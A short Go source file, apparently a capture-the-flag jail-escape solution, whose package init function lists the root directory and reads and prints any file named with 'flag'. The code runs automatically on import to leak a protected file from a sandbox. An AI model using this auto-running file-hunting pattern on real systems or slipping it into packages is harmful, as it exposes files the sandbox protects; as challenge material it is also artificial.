package jail

import (
	"fmt"
	"os"
	"strings"
)

func init() {
	entries, _ := os.ReadDir("/")

	for _, e := range entries {
		fmt.Println(e.Name())

		if !strings.Contains(e.Name(), "flag") {
			continue
		}

		flag, _ := os.ReadFile("/" + e.Name())
		fmt.Println(flag)
		return
	}

	fmt.Println("failed to find flag :(")
}
